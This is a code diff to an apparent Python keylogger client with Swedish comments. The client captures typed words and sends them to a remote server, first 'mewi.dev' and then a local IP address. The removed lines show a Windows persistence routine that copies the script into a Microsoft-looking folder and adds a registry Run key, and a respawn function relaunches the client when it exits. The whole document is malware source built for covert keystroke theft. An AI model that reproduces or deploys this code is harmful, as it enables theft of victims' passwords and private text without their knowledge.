@@ -88,7 +88,7 @@ class Client:
 
                     prefix = "_" if key == "space" else "↴"
                     self.send_message(f"r{prefix} {''.join(word)}")
-                    self.send_message(f"p{prefix} {''.join(word_processed)}")
+                    self.send_message(f"p{prefix} {''.join(word_processed) or ' '}")
                     self.debug_message("KEYLOGGER",
                                        f"Sending keys to {self.host}:{self.port}: {prefix}r/p | {''.join(word)} / {''.join(word_processed)}")
                     break
@@ -277,65 +277,19 @@ class PackageManager:
         except subprocess.CalledProcessError:
             raise Exception(f"{package=} does not exist")
 
-"""
-@atexit.register
+
+# @atexit.register
 def respawn():
     if not client.stop_message:
         client.disconnect()
 
     client.debug_message("RESPAWNING", "Respawning client script")
-    subprocess.Popen([sys.executable, f"C:\\Microsoft\\kl_client\\client.pyw"], shell=True)
-    
-Startar om programmet när det avslutas (respawn)
-"""
-
-
-def set_os_startup_launch():
-    local_os = sys.platform
-    match local_os:
-        case "aix":
-            raise NotImplementedError
-
-        case "linux":
-            raise NotImplementedError
-
-        case "win32":
-            dest_dir = "C:\\Microsoft\\kl_client\\"
-            dest_path = dest_dir + "client.pyw"
-
-            if sys.argv[0] != dest_path:
-                os.makedirs(dest_dir, exist_ok=True)
-                shutil.copy(__file__, dest_path)
-
-            key = winreg.HKEY_CURRENT_USER
-            sub_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-
-            if WindowsRegistryEditor.value_exists(key, sub_key, "client.pyw"):
-                WindowsRegistryEditor.edit_value(key, sub_key, "client.pyw", f'"{sys.executable}" "{dest_path}"')
-                return
-
-            WindowsRegistryEditor.add_value(key, sub_key, "client.pyw", f'"{sys.executable}" "{dest_path}"')
-            return
-
-        case "cygwin":
-            raise NotImplementedError
-        case "darwin":
-            raise NotImplementedError
+    subprocess.Popen([sys.executable, f"C:\\Microsoft\\kl_client\\{os.path.basename(sys.argv[0])}"], shell=True)
 
 
 if __name__ == "__main__":
-    # Automatiskt installera dependencies
-    if not PackageManager.package_is_installed("keyboard"):
-        PackageManager.install_package("keyboard")
+    PackageManager.install_package("keyboard")
     import keyboard
 
-    """
-    set_os_startup_launch()
-    
-    Placerar en kopia av detta program i 'C:\Microsoft\kl_client\client.pyw' och lägger till programmet i windows
-    startup
-    """
-
-    # Skapa ett klientobjekt och starta det
-    client = Client("mewi.dev", 5050, debug=True)
+    client = Client("192.168.1.11", 5050, debug=True)
     client.start()
